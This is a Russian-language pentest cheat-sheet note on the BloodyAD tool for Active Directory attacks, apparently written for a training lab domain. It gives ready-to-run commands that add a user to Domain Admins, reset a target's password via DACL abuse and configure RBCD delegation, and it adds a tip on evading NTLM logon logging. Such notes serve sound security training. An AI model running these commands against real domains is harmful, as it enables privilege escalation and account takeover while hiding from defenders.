#tool #windows #recon #AD #enumeration #exploitation

**BloodyAD** — это современный инструмент для продвинутого перечисления (enumeration) и, что более важно, **активной эксплуатации** объектов Active Directory. Если ADRecon — это отчет для аудита, а [[BloodHound]] — карта путей, то BloodyAD — это «швейцарский нож» для выполнения конкретных манипуляций с объектами домена (ACE, групповые политики, атрибуты).

Инструмент особенно эффективен в связке с BloodHound, когда нужно реализовать найденный путь атаки.

- **Этап:** Enumeration & Exploitation (Перечисление и эксплуатация).

- **Цель:** Изменение прав доступа (DACL), сброс паролей, создание новых объектов, выполнение атак типа RBCD (Resource-Based [[Constrained Delegation]]) и Shadow Credentials.
### Эксплуатация

**Сбор данных
```bash
# Получить информацию о конкретном пользователе
bloodyAD -u 'username' -p 'password' -d 'codeby.cdb' -host '192.168.2.4' get object 'TargetUser'
```

**Активная эксплуатация**
```bash
# Добавить пользователя в группу (например, Domain Admins, если есть права)
bloodyAD -u 'admin_user' -p 'pass' -d 'codeby.cdb' -host '192.168.2.4' add groupMember 'Domain Admins' 'MyUser'

# Установка контроля над объектом через GenericAll (DACL Abuse)
bloodyAD -u 'user' -p 'pass' -d 'codeby.cdb' -host '192.168.2.4' set password 'TargetUser' 'NewPassword123!'
```

**Продвинутые атаки (RBCD):**
```bash
# Настройка ограниченного делегирования на основе ресурсов
bloodyAD -u 'user' -p 'pass' -host '192.168.2.4' set rbcd 'ComputerTarget' 'ComputerAttacker'
```

**Использование Kerberos:** Вместо передачи пароля в открытом виде (через ключ `-p`), используй билеты Kerberos (флаг `-k`), чтобы избежать лишних событий входа NTLM.